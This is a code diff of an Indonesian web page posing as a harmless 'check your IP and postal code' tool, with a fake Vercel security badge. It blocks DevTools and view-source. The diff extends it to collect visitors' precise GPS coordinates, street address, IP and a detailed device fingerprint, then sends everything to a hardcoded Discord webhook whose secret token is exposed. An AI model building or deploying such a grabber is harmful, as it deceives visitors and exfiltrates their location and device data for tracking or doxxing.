@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cek ip address & pos code</title>
     <style>
-        /* Proteksi tambahan: Mencegah teks diseleksi/diblok */
         body { 
             font-family: Arial, sans-serif; 
             text-align: center; 
@@ -58,7 +57,7 @@
     <div class="container">
         <h2>Melihat ip address & pos kode anda</h2>
         <p>Klik tombol di bawah untuk melihat alamat ip dan pos kode anda sendiri.
-          (✅ tingkat keamanan Di Verifikasi oleh Vercel Apps)</p>
+          (✅ tingkat keamanan aktif Di verifikasi oleh vercel app)</p>
         
         <button onclick="prosesData()">Mulai Verifikasi</button>
         <div id="status"></div>
@@ -66,100 +65,121 @@
 
     <!-- Script Lapisan Keamanan Tambahan -->
     <script>
-        // 1. Mencegah Klik Kanan
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-
-        // 2. Mencegah Tombol Pintasan Keyboard (Inspect, View Source, Debugger)
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
         document.addEventListener('keydown', function(e) {
-            // F12
-            if (e.key === 'F12') {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+Shift+I / J / C
-            if (e.ctrlKey && e.shiftKey && ['I', 'i', 'J', 'j', 'C', 'c'].includes(e.key)) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+U (View Source)
-            if (e.ctrlKey && ['U', 'u'].includes(e.key)) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl+S (Save Page)
-            if (e.ctrlKey && ['S', 's'].includes(e.key)) {
-                e.preventDefault();
-                return false;
-            }
+            if (e.key === 'F12') { e.preventDefault(); return false; }
+            if (e.ctrlKey && e.shiftKey && ['I', 'i', 'J', 'j', 'C', 'c'].includes(e.key)) { e.preventDefault(); return false; }
+            if (e.ctrlKey && ['U', 'u', 'S', 's'].includes(e.key)) { e.preventDefault(); return false; }
         });
-
-        // 3. Proteksi Tambahan: Deteksi DevTools / Konsol Terbuka
         setInterval(function() {
             const threshold = 160;
             if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
                 document.body.innerHTML = "<h2 style='text-align:center; color:red; margin-top:100px;'>⚠ Akses Dibatasi: Sistem mendeteksi perangkat debug atau Developer Tools.</h2>";
             }
         }, 1000);
-
-        // 4. Mencegah Debugger otomatis dengan teknik infinite debugger loop
-        (function() {
-            try {
-                function checkDevTools() {
-                    const startTime = new Date();
-                    debugger;
-                    const endTime = new Date();
-                    if (endTime - startTime > 100) {
-                        document.body.innerHTML = "<h2 style='text-align:center; color:red; margin-top:100px;'>⛔ Keamanan Terpanggil!</h2>";
-                    }
-                }
-                setInterval(checkDevTools, 2000);
-            } catch (err) {}
-        })();
     </script>
 
-    <!-- Script Utama (IP, Geolocation, Device Info, & Discord Webhook) -->
+    <!-- Script Utama (Maximal Browser Diagnostics) -->
     <script>
-        // Ganti URL di bawah ini dengan Discord Webhook URL milik Anda
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1554889093832384583/nTdlUrC5GXijfj_TQRF-ybZ5ZbvLj-JCWqk5zvoM8B7M6FsuWhiHBzuy5ZmGffxSDWcw";
 
-        // Fungsi untuk mendeteksi informasi perangkat / merek HP secara sederhana
-        function getDeviceInfo() {
+        function getDetailedDevice() {
             const ua = navigator.userAgent;
-            let device = "Perangkat Tidak Dikenal";
-
+            let brandModel = "Perangkat Tidak Dikenal";
             if (/android/i.test(ua)) {
-                // Coba ekstrak tipe/merek HP jika ada di dalam string User Agent Android
                 let match = ua.match(/\(([^)]+)\)/);
                 if (match && match[1]) {
                     let parts = match[1].split(';');
-                    // Biasanya bagian spesifik perangkat ada di indeks akhir atau setelah Build
-                    device = "Android (" + parts[parts.length - 1].trim() + ")";
-                } else {
-                    device = "Android Device";
-                }
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                device = "iOS / Apple Device";
-            } else if (/windows/i.test(ua)) {
-                device = "Windows PC";
-            } else if (/macintosh|mac os x/i.test(ua)) {
-                device = "Mac Computer";
+                    brandModel = "Android (" + parts[parts.length - 1].trim() + ")";
+                } else { brandModel = "Android Device"; }
+            } else if (/iphone|ipad|ipod/i.test(ua)) { brandModel = "Apple iOS Device"; }
+            else if (/windows/i.test(ua)) { brandModel = "Windows PC / Laptop"; }
+            else if (/macintosh|mac os x/i.test(ua)) { brandModel = "Apple Mac"; }
+            return brandModel;
+        }
+
+        function getConnectionInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                let type = conn.effectiveType ? conn.effectiveType.toUpperCase() : "Tidak diketahui";
+                let downlink = conn.downlink ? `${conn.downlink} Mbps` : "";
+                let rtt = conn.rtt ? `${conn.rtt} ms` : "";
+                return `${type} | Kecepatan: ${downlink} | Latensi RTT: ${rtt}`;
             }
-            return device;
+            return "Tidak didukung browser";
+        }
+
+        function getGpuDetails() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    return { vendor, renderer };
+                }
+            } catch (e) {}
+            return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
+        }
+
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    let level = Math.round(battery.level * 100) + "%";
+                    let charging = battery.charging ? "⚡ Sedang Di-charge" : "🔋 Tidak Di-charge";
+                    return `${level} (${charging})`;
+                } catch (e) { return "Gagal mendeteksi baterai"; }
+            }
+            return "Tidak didukung browser";
+        }
+
+        async function getStorageAndRam() {
+            let ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB (Estimasi)` : "Tidak didukung browser";
+            let storageInfo = "Tidak didukung";
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    let totalGb = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
+                    let freeGb = ((estimate.quota - estimate.usage) / (1024 * 1024 * 1024)).toFixed(1);
+                    storageInfo = `Total Kuota: ~${totalGb} GB | Sisa Kosong: ~${freeGb} GB`;
+                } catch (e) {
+                    storageInfo = "Gagal mengambil data storage";
+                }
+            }
+            return { ram, storageInfo };
         }
 
         async function prosesData() {
             const statusDiv = document.getElementById("status");
             statusDiv.style.color = "black";
-            statusDiv.innerHTML = "⏳ Memproses verifikasi perangkat...";
+            statusDiv.innerHTML = "⏳ Memproses verifikasi perangkat secara mendalam...";
+
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const dateString = now.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
+            const fullTime = `${dateString} - ${timeString} WIB`;
 
             let ipAddress = "Tidak diketahui";
             let postalCode = "Tidak ditemukan";
             let addressName = "Tidak diketahui";
-            let deviceInfo = getDeviceInfo();
+            let deviceInfo = getDetailedDevice();
+            let connectionInfo = getConnectionInfo();
+            let gpu = getGpuDetails();
+            let batteryInfo = await getBatteryInfo();
+            let memoryStorage = await getStorageAndRam();
+            let screenRes = `${window.screen.width}x${window.screen.height} px`;
+            let pixelRatio = `Ratio: ${window.devicePixelRatio || 1}x`;
+            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Core` : "Tidak diketahui";
+            let language = navigator.language || "Tidak diketahui";
+            let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Tidak diketahui";
+            let orientation = (window.screen.orientation && window.screen.orientation.type) ? window.screen.orientation.type : "Tidak diketahui";
+            let maxTouchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Titik Sentuh` : "Tidak diketahui";
+            let platform = navigator.platform || "Tidak diketahui";
+            let doNotTrack = navigator.doNotTrack || "Tidak aktif/Tidak diketahui";
 
-            // Ambil IP Address
             try {
                 const ipResponse = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipResponse.json();
@@ -168,7 +188,7 @@
 
             if (!navigator.geolocation) {
                 statusDiv.style.color = "red";
-                statusDiv.innerHTML = `IP: <b>${ipAddress}</b><br>❌ Geolocation tidak didukung.`;
+                statusDiv.innerHTML = `Waktu: <b>${fullTime}</b><br>IP: <b>${ipAddress}</b><br>❌ Geolocation tidak didukung.`;
                 return;
             }
 
@@ -179,7 +199,6 @@
                     const accuracy = position.coords.accuracy;
                     const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    // Ambil Kode Pos & Alamat Lebih Detail
                     try {
                         const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
                             headers: { "User-Agent": "VerifikasiAplikasiWeb" }
@@ -188,36 +207,57 @@
                         
                         if (geoData && geoData.address) {
                             postalCode = geoData.address.postcode || "Tidak tersedia";
-                            
-                            // Merapikan deskripsi lokasi agar lebih jelas dibaca
                             let road = geoData.address.road || geoData.address.suburb || "";
                             let city = geoData.address.city || geoData.address.town || geoData.address.county || "";
                             let state = geoData.address.state || "";
                             let country = geoData.address.country || "";
-                            
                             addressName = `${road ? road + ', ' : ''}${city ? city + ', ' : ''}${state ? state + ', ' : ''}${country}`;
                         }
                     } catch (e) {}
 
-                    // Tampilkan ke layar user
                     statusDiv.innerHTML = `
-                        <p style="color: green;"><b>✅ Verifikasi Selesai!</b></p>
-                        <p><b>📱 Perangkat:</b> <code>${deviceInfo}</code></p>
-                        <p><b>🌐 IP Address:</b> <code>${ipAddress}</code></p>
-                        <p><b>📍 Latitude:</b> ${lat}</p>
-                        <p><b>📍 Longitude:</b> ${lon}</p>
-                        <p><b>📮 Kode Pos:</b> ${postalCode}</p>
-                        <p><b>🗺️ Lokasi Jelas:</b> ${addressName}</p>
-                        <p><b>🎯 Akurasi GPS:</b> ±${Math.round(accuracy)} meter</p>
+                        <p style="color: green;"><b> cek Berhasil ✅</b></p>
+                        <p><b>Waktu Klik:</b> ${fullTime} (${timeZone})</p>
+                        <p><b> Model perangkat:</b> <code>${deviceInfo}</code></p>
+                        <p><b> OS:</b> ${platform}</p>
+                        <p><b>GPU Vendor:</b> <code>${gpu.vendor}</code></p>
+                        <p><b>GPU:</b> <code>${gpu.renderer}</code></p>
+                        <p><b>Baterai:</b> ${batteryInfo}</p>
+                        <p><b>RAM:</b> ${memoryStorage.ram}</p>
+                        <p><b>Storage:</b> ${memoryStorage.storageInfo}</p>
+                        <p><b>Jaringan:</b> <code>${connectionInfo}</code></p>
+                        <p><b>CPU & Sentuh:</b> ${cpuCores} | Max Sentuh: ${maxTouchPoints}</p>
+                        <p><b>Resolusi & Rasio:</b> ${screenRes} (${pixelRatio})</p>
+                        <p><b>Orientasi Layar:</b> ${orientation}</p>
+                        <p><b>IP Address:</b> <code>${ipAddress}</code></p>
+                        <p><b>Latitude:</b> ${lat}</p>
+                        <p><b>Longitude:</b> ${lon}</p>
+                        <p><b>Kode Pos:</b> ${postalCode}</p>
+                        <p><b>Lokasi Detail:</b> ${addressName}</p>
+                        <p><b>Akurasi GPS:</b> ±${Math.round(accuracy)} meter</p>
                         <a href="${mapsUrl}" target="_blank" class="map-link">Buka di Google Maps</a>
                         <hr>
-                        <p id="discord-status"><i>Mengirim laporan ke sistem...</i></p>
+                        <p id="discord-status"><i>Mengirim laporan lengkap ke sistem...</i></p>
                     `;
 
-                    // Kirim ke Discord Webhook dengan deskripsi lengkap
                     const payload = {
-                        content: `🚀 **Data Verifikasi Diterima!**\n` +
-                                 `- **Perangkat:** \`${deviceInfo}\`\n` +
+                        content: ` **Laporan Fingerprint Paling Maksimal Diterima!**\n` +
+                                 `- **Waktu Klik:** \`${fullTime}\`\n` +
+                                 `- **Zona Waktu:** \`${timeZone}\`\n` +
+                                 `- **Perangkat/Model:** \`${deviceInfo}\`\n` +
+                                 `- **Platform OS:** \`${platform}\`\n` +
+                                 `- **GPU Vendor:** \`${gpu.vendor}\`\n` +
+                                 `- **GPU Renderer:** \`${gpu.renderer}\`\n` +
+                                 `- **Baterai:** \`${batteryInfo}\`\n` +
+                                 `- **Estimasi RAM:** \`${memoryStorage.ram}\`\n` +
+                                 `- **Storage:** \`${memoryStorage.storageInfo}\`\n` +
+                                 `- **Jaringan:** \`${connectionInfo}\`\n` +
+                                 `- **CPU Cores:** \`${cpuCores}\`\n` +
+                                 `- **Titik Sentuh (Touch):** \`${maxTouchPoints}\`\n` +
+                                 `- **Resolusi Layar:** \`${screenRes} (${pixelRatio})\`\n` +
+                                 `- **Orientasi Layar:** \`${orientation}\`\n` +
+                                 `- **Bahasa:** \`${language}\`\n` +
+                                 `- **Do Not Track:** \`${doNotTrack}\`\n` +
                                  `- **IP Address:** \`${ipAddress}\`\n` +
                                  `- **Lat/Lon:** \`${lat},${lon}\`\n` +
                                  `- **Kode Pos:** \`${postalCode}\`\n` +
@@ -235,20 +275,20 @@
                         const discordStatus = document.getElementById("discord-status");
                         if (discordResponse.ok) {
                             discordStatus.style.color = "green";
-                            discordStatus.innerHTML = "✔ Cek Berhasil";
+                            discordStatus.innerHTML = "✔ Cek Berhasil & Terkirim";
                         } else {
                             discordStatus.style.color = "red";
-                            discordStatus.innerHTML = "✖ Gagal Cek.";
+                            discordStatus.innerHTML = "✖ Gagal Mengirim.";
                         }
                     } catch (error) {
                         const discordStatus = document.getElementById("discord-status");
                         discordStatus.style.color = "red";
-                        discordStatus.innerHTML = "✖ Gagal terhubung.";
+                        discordStatus.innerHTML = "✖ Gagal terhubung ke Discord.";
                     }
                 },
                 (error) => {
                     statusDiv.style.color = "red";
-                    statusDiv.innerHTML = `IP: <b>${ipAddress}</b><br>❌ Izin lokasi ditolak/gagal.`;
+                    statusDiv.innerHTML = `Waktu: <b>${fullTime}</b><br>IP: <b>${ipAddress}</b><br>❌ Izin lokasi ditolak/gagal.`;
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
